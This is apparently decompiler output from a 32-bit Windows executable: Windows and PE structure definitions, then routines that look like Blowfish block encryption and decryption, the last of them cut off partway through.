typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    dword hash;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef int __ehstate_t;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
};


// WARNING! conflicting data type names: /guiddef.h/GUID - /GUID

typedef struct _GUID _GUID, *P_GUID;

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

typedef uint UINT;

typedef uchar BYTE;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void *HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

typedef ulong DWORD;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _TIME_ZONE_INFORMATION _TIME_ZONE_INFORMATION, *P_TIME_ZONE_INFORMATION;

typedef struct _TIME_ZONE_INFORMATION *LPTIME_ZONE_INFORMATION;

typedef long LONG;

typedef wchar_t WCHAR;

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

typedef ushort WORD;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

struct _TIME_ZONE_INFORMATION {
    LONG Bias;
    WCHAR StandardName[32];
    SYSTEMTIME StandardDate;
    LONG StandardBias;
    WCHAR DaylightName[32];
    SYSTEMTIME DaylightDate;
    LONG DaylightBias;
};

typedef struct _WIN32_FIND_DATAA _WIN32_FIND_DATAA, *P_WIN32_FIND_DATAA;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

typedef char CHAR;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAA {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    CHAR cFileName[260];
    CHAR cAlternateFileName[14];
};

typedef struct _OFSTRUCT _OFSTRUCT, *P_OFSTRUCT;

struct _OFSTRUCT {
    BYTE cBytes;
    BYTE fFixedDisk;
    WORD nErrCode;
    WORD Reserved1;
    WORD Reserved2;
    CHAR szPathName[128];
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef CHAR *LPSTR;

typedef BYTE *LPBYTE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _WIN32_FIND_DATAA *LPWIN32_FIND_DATAA;

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef struct _OFSTRUCT *LPOFSTRUCT;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SYSTEMTIME *LPSYSTEMTIME;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef long HRESULT;

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef CHAR *LPCH;

typedef WCHAR *LPWSTR;

typedef WCHAR *PCNZWCH;

typedef WCHAR *LPWCH;

typedef DWORD ACCESS_MASK;

typedef WCHAR *LPCWSTR;

typedef DWORD LCID;

typedef CHAR *PCNZCH;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef uint UINT_PTR;

typedef ULONG_PTR SIZE_T;

typedef int (*FARPROC)(void);

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

struct HDC__ {
    int unused;
};

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef int INT;

typedef DWORD *LPDWORD;

typedef WORD *LPWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef BOOL *LPBOOL;

typedef uint *PUINT;

typedef struct HINSTANCE__ *HINSTANCE;

typedef void *LPCVOID;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

struct HWND__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef char *va_list;




undefined4 * __fastcall FUN_004090c0(undefined4 *param_1)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00415090((uint *)0x48);
  *param_1 = uVar1;
  uVar1 = FUN_00415090((uint *)0x1000);
  param_1[1] = uVar1;
  return param_1;
}



void __fastcall FUN_004090e0(LPVOID *param_1)

{
  FUN_0041509e(*param_1);
  FUN_0041509e(param_1[1]);
  return;
}



void __thiscall FUN_00409100(void *this,uint *param_1,uint *param_2)

{
  uint *puVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  
                    // WARNING: Load size is inaccurate
  puVar1 = *this;
  uVar5 = *param_1 ^ *puVar1;
  iVar2 = *(int *)((int)this + 4);
  uVar4 = (*(int *)(iVar2 + 0x400 + (uVar5 >> 0x10 & 0xff) * 4) +
           *(int *)(iVar2 + (uVar5 >> 0x18) * 4) ^
          *(uint *)(iVar2 + 0x800 + (uVar5 >> 8 & 0xff) * 4)) +
          *(int *)(iVar2 + 0xc00 + (uVar5 & 0xff) * 4) ^ puVar1[1] ^ *param_2;
  uVar5 = uVar5 ^ (*(int *)(iVar2 + 0x400 + (uVar4 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar4 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar4 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar4 & 0xff) * 4) ^ puVar1[2];
  uVar4 = uVar4 ^ (*(int *)(iVar2 + 0x400 + (uVar5 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar5 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar5 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar5 & 0xff) * 4) ^ puVar1[3];
  uVar5 = uVar5 ^ (*(int *)(iVar2 + 0x400 + (uVar4 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar4 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar4 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar4 & 0xff) * 4) ^ puVar1[4];
  uVar4 = uVar4 ^ (*(int *)(iVar2 + 0x400 + (uVar5 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar5 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar5 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar5 & 0xff) * 4) ^ puVar1[5];
  uVar5 = uVar5 ^ (*(int *)(iVar2 + 0x400 + (uVar4 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar4 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar4 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar4 & 0xff) * 4) ^ puVar1[6];
  uVar4 = uVar4 ^ (*(int *)(iVar2 + 0x400 + (uVar5 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar5 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar5 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar5 & 0xff) * 4) ^ puVar1[7];
  uVar5 = uVar5 ^ (*(int *)(iVar2 + 0x400 + (uVar4 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar4 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar4 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar4 & 0xff) * 4) ^ puVar1[8];
  uVar4 = uVar4 ^ (*(int *)(iVar2 + 0x400 + (uVar5 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar5 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar5 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar5 & 0xff) * 4) ^ puVar1[9];
  uVar5 = uVar5 ^ (*(int *)(iVar2 + 0x400 + (uVar4 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar4 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar4 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar4 & 0xff) * 4) ^ puVar1[10];
  uVar4 = uVar4 ^ (*(int *)(iVar2 + 0x400 + (uVar5 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar5 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar5 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar5 & 0xff) * 4) ^ puVar1[0xb];
  uVar5 = uVar5 ^ (*(int *)(iVar2 + 0x400 + (uVar4 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar4 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar4 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar4 & 0xff) * 4) ^ puVar1[0xc];
  uVar4 = uVar4 ^ (*(int *)(iVar2 + 0x400 + (uVar5 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar5 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar5 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar5 & 0xff) * 4) ^ puVar1[0xd];
  uVar5 = uVar5 ^ (*(int *)(iVar2 + 0x400 + (uVar4 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar4 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar4 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar4 & 0xff) * 4) ^ puVar1[0xe];
  uVar4 = uVar4 ^ (*(int *)(iVar2 + 0x400 + (uVar5 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar5 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar5 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar5 & 0xff) * 4) ^ puVar1[0xf];
  uVar3 = puVar1[0x11];
  *param_2 = uVar5 ^ (*(int *)(iVar2 + 0x400 + (uVar4 >> 0x10 & 0xff) * 4) +
                      *(int *)(iVar2 + (uVar4 >> 0x18) * 4) ^
                     *(uint *)(iVar2 + 0x800 + (uVar4 >> 8 & 0xff) * 4)) +
                     *(int *)(iVar2 + 0xc00 + (uVar4 & 0xff) * 4) ^ puVar1[0x10];
  *param_1 = uVar4 ^ uVar3;
  return;
}



void __thiscall FUN_00409500(void *this,uint *param_1,uint *param_2)

{
  uint *puVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  
                    // WARNING: Load size is inaccurate
  puVar1 = *this;
  uVar8 = puVar1[0x11] ^ *param_1;
  iVar2 = *(int *)((int)this + 4);
  uVar7 = (*(int *)(iVar2 + 0x400 + (uVar8 >> 0x10 & 0xff) * 4) +
           *(int *)(iVar2 + (uVar8 >> 0x18) * 4) ^
          *(uint *)(iVar2 + 0x800 + (uVar8 >> 8 & 0xff) * 4)) +
          *(int *)(iVar2 + 0xc00 + (uVar8 & 0xff) * 4) ^ puVar1[0x10] ^ *param_2;
  uVar8 = uVar8 ^ (*(int *)(iVar2 + 0x400 + (uVar7 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar7 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar7 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar7 & 0xff) * 4) ^ puVar1[0xf];
  uVar7 = uVar7 ^ (*(int *)(iVar2 + 0x400 + (uVar8 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar8 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar8 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar8 & 0xff) * 4) ^ puVar1[0xe];
  uVar8 = uVar8 ^ (*(int *)(iVar2 + 0x400 + (uVar7 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar7 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar7 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar7 & 0xff) * 4) ^ puVar1[0xd];
  uVar7 = uVar7 ^ (*(int *)(iVar2 + 0x400 + (uVar8 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar8 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar8 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar8 & 0xff) * 4) ^ puVar1[0xc];
  uVar8 = uVar8 ^ (*(int *)(iVar2 + 0x400 + (uVar7 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar7 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar7 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar7 & 0xff) * 4) ^ puVar1[0xb];
  uVar7 = uVar7 ^ (*(int *)(iVar2 + 0x400 + (uVar8 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar8 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar8 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar8 & 0xff) * 4) ^ puVar1[10];
  uVar8 = uVar8 ^ (*(int *)(iVar2 + 0x400 + (uVar7 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar7 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar7 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar7 & 0xff) * 4) ^ puVar1[9];
  uVar7 = uVar7 ^ (*(int *)(iVar2 + 0x400 + (uVar8 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar8 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar8 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar8 & 0xff) * 4) ^ puVar1[8];
  uVar8 = uVar8 ^ (*(int *)(iVar2 + 0x400 + (uVar7 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar7 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar7 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar7 & 0xff) * 4) ^ puVar1[7];
  uVar7 = uVar7 ^ (*(int *)(iVar2 + 0x400 + (uVar8 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar8 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar8 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar8 & 0xff) * 4) ^ puVar1[6];
